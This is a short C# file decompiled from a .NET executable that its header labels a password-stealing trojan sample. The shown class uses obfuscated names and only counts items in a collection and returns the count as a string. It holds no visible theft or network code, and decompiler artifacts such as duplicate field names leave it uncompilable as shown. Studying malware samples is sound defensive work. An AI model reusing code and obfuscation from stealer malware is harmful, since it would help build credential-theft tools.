// Decompiled with JetBrains decompiler
// Type: w7H.Lt2
// Assembly: k3F4, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EF2862A8-7088-4F2B-ADD5-AFDC446098D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee71029a7b3d9d85e7a6c7c0ecc35d93ee37514713ba5033d491a0d7506e947b.exe

using Microsoft.VisualBasic.CompilerServices;
using Pz9;
using System;
using System.Collections.Generic;
using x7X;

namespace w7H
{
  [StandardModule]
  internal sealed class Lt2
  {
    public static w2M[] Ⴗ = new w2M[100000];
    public static int Ⴗ = 0;

    public static string m8L()
    {
      Lt2.Ⴗ = 0;
      object obj = (object) new Tt1();
      object enumerator;
      try
      {
        enumerator = (object) ((Tt1) obj).Ⴍ.GetEnumerator();
        while ((enumerator as IEnumerator<w2M>).MoveNext())
        {
          IEquatable<string> ⴍ = (IEquatable<string>) (enumerator as IEnumerator<w2M>).Current.Ⴍ;
          checked { ++Lt2.Ⴗ; }
        }
      }
      finally
      {
        if (enumerator is IEnumerator<w2M>)
          (enumerator as IEnumerator<w2M>).Dispose();
      }
      IEnumerable<char> message;
      try
      {
        message = (IEnumerable<char>) Lt2.Ⴗ.ToString("13WAR00000");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        message = (IEnumerable<char>) ((object) ex as Exception).Message;
        ProjectData.ClearProjectError();
      }
      return (string) message;
    }
  }
}
